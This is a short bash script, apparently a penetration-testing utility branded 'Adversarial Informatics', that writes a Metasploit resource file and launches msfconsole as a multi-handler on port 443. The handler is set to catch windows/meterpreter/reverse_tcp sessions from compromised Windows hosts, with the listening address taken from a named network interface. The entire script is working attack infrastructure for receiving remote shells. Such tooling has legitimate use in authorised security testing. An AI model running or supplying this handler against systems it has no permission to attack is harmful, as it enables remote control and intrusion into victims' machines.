#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_-----------------------------------------------+"
echo -e "|  Adversarial Informatics MSF Meterpreter Handler  |"
echo -e "|               cygienesolutions.com                |"
echo -e "|   [Usage]: ./msf_handler_aic.sh <INF> <TARGET>    |"
echo -e "+---------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Starts the MSF Multi-Handler on port 443."
    echo -e ""
    echo -e "[Usage]: ./msf_handler_aic.sh tap0 192.168.1.44"
    echo -e "${NC}"
    exit 1; fi

INTERFACE="$1"
TARGET="$2"
LOCALIP=$(ifconfig $INTERFACE | grep 'inet' | cut -d: -f2 | awk '{print $2}')


# Creating a multi-handler, and backgrounding the process
echo use exploit/multi/handler > handler.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> handler.rc
echo set LHOST $LOCALIP >> handler.rc
echo set LPORT 443 >> handler.rc
echo set ExitOnSession false >> handler.rc
echo exploit -j -z >> handler.rc
echo -e "${GREEN}"
echo -e "Initiating MSF Multi-handler on port: 443"
echo -e "${NC}"
msfconsole -r ./handler.rc
echo -e "Done."
netstat -ano | grep 443





